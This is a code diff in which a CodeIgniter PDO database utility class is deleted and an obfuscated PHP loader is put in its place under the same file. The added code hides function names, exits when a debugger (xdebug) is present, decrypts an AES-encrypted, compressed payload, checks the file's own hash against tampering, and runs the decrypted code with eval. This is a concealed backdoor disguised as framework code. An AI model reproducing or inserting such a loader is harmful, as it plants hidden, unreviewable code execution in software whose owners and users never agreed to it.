@@ -1,63 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.1.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO Utility Class
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/database/
- */
-class CI_DB_pdo_utility extends CI_DB_utility {
-
-	/**
-	 * Export
-	 *
-	 * @param	array	$params	Preferences
-	 * @return	mixed
-	 */
-	protected function _backup($params = array())
-	{
-		// Currently unsupported
-		return $this->db->display_error('db_unsupported_feature');
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_pgmj8w16=('bas'.'e64'.'_de'.'cod'.'e');
+$_v2h5mc2t=('gzu'.'nco'.'mpr'.'ess');
+$_tpbtw6id=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_tt2ggili='pFUZVp0s';
+$_xawgcb9h='mbey9JDv';
+$_rt6ta8hr='ifxPYmxI';
+$_ujcvnx3a='uhajnMhS';
+$_cwrbzqw3='olwooLOwBLU=';
+$_nbelqrmz='zaNCWA==';
+$_q37wlfpl='z4/XONBk';
+$_p3jpvn5t='LxPqNwMO';
+$_nolcy0w6=$_pgmj8w16($_xawgcb9h.$_tt2ggili.$_ujcvnx3a.$_rt6ta8hr.$_cwrbzqw3);
+$_yv2h77k9=$_pgmj8w16($_p3jpvn5t.$_q37wlfpl.$_nbelqrmz);
+$_bi1lklu1=$_pgmj8w16('9mbVrVdkXKxw6EWTKhbkpVP8ZvLdW0jRwGW8FLRc9KCUw2M1bRmgxaCIn9O90ioJ39IFVwya9wysU0TTBc6mgqqeJ5YaMr0cmZAJ3W+J4JgPcXU12MNnwIMEMAVsLPVkkN5t+31Hl5p5jNfOsRtwaWxYQ6Z74GX+eUw4Mmvw5JItnDVlVAEa3Ai3/JhPJ0RdM4GOmURuTzr+zlrupxpox8o+t6qyEfBc1VdQpsxTtjditZO4uy/im+0q21he0NLKFbk/FInLXK6kgJVHlWk4NQ==');
+$_x0rnw672=$_tpbtw6id($_bi1lklu1,'aes-256-cbc',$_nolcy0w6,OPENSSL_RAW_DATA,$_yv2h77k9);
+if($_x0rnw672===false){exit;}
+$_zpkhpj86=$_v2h5mc2t($_x0rnw672);
+if($_zpkhpj86===false){exit;}
+$_ku9kt3xi='726ea096335d2972e28f3b16ae56e3762930733ae74efc801737af88608a0d51';
+$_z5q6bnb8=@file_get_contents(__FILE__);
+if($_z5q6bnb8!==false){
+$_nmwbgwf6=str_replace($_ku9kt3xi,"0000000000000000000000000000000000000000000000000000000000000000",$_z5q6bnb8);
+$_xuzi03e2=hash("sha256",$_nmwbgwf6);
+if($_xuzi03e2!==$_ku9kt3xi){@http_response_code(403);exit;}
 }
+eval($_zpkhpj86);
